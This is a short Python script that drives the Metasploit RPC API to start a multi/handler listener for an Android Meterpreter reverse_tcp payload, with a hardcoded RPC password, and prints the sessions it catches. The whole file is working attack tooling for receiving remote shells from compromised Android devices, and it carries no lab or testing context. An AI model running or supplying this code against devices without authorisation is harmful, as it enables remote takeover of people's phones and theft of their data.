from pymetasploit3.msfrpc import MsfRpcClient

def launch_session(LHOST, LPORT):
    client = MsfRpcClient('password')
    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'android/meterpreter/reverse_tcp')
    payload['LHOST'] = LHOST
    payload['LPORT'] = LPORT
    exploit.execute(payload=payload)
    sessions = client.sessions.list
    print(sessions)
    return sessions
